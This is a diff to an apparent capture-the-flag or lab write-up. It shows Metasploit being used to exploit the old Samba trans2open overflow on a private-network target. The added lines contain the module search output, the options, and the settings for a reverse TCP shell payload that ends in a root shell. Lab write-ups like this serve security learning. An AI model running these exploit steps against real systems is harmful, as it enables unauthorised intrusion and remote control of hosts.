@@ -97,7 +97,9 @@ First I go to the web page as http service is running but we get nothing much an
 
 So, I go back to the nmap scan results and look for other services and their versions. I've found a promising target for exploitation: the SMB service. Since the version is not disclosed, it's time to use our trusted tool, Metasploit, to proceed.
 
-``` msfconsole ```
+``` 
+msfconsole
+```
 
 Here I searched for the “scanner smb” auxiliary module to scan the target and get the running version of the smb service.
 
@@ -223,17 +225,67 @@ Now we have got the version, it’s time search for the available exploit to att
 As the exploit is available on `Rapid7` which means that its module will surely be available on `metasploit`
 Now I moved back to metasploit and search for the available exploit for “trans2open”.
 
-search trans2open
-There are multiple exploits available, we have to choose for linux, which is on no. 1, so i use the command
+```console
+msf6 > search trans2open
 
-use 1
-and then set the payload as generic reverse shell tcp -
+Matching Modules
+================
 
-set payload generic/shell_reverse_tcp
+   #  Name                              Disclosure Date  Rank   Check  Description
+   -  ----                              ---------------  ----   -----  -----------
+   0  exploit/freebsd/samba/trans2open  2003-04-07       great  No     Samba trans2open Overflow (*BSD x86)
+   1  exploit/linux/samba/trans2open    2003-04-07       great  No     Samba trans2open Overflow (Linux x86)
+   2  exploit/osx/samba/trans2open      2003-04-07       great  No     Samba trans2open Overflow (Mac OS X PPC)
+   3  exploit/solaris/samba/trans2open  2003-04-07       great  No     Samba trans2open Overflow (Solaris SPARC)
 
-then set the rhosts to our target IP -
 
-set rhosts 192.168.110.128
+Interact with a module by name or index. For example info 3, use 3 or use exploit/solaris/samba/trans2open
+
+```
+
+There are multiple exploits available, we have to choose for linux, which is on `number 1`.
+- use exploit/linux/samba/trans2open or use 1 
+- show options
+- set the RHOSTS with the target IP i.e. `192.168.78.131`
+- set payload to linux/x86/shell_reverse_tcp
+
+```console
+msf6 > use exploit/linux/samba/trans2open
+[*] No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp
+msf6 exploit(linux/samba/trans2open) > show options
+
+Module options (exploit/linux/samba/trans2open):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT   139              yes       The target port (TCP)
+
+
+Payload options (linux/x86/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.78.129   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Samba 2.2.x - Bruteforce
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(linux/samba/trans2open) > set RHOSTS 192.168.78.131
+RHOSTS => 192.168.78.131
+msf6 exploit(linux/samba/trans2open) > set payload linux/x86/shell_reverse_tcp
+payload => linux/x86/shell_reverse_tcp
+
+```
 
 Then simply run the exploit and voilla!, I get the root shell.
 
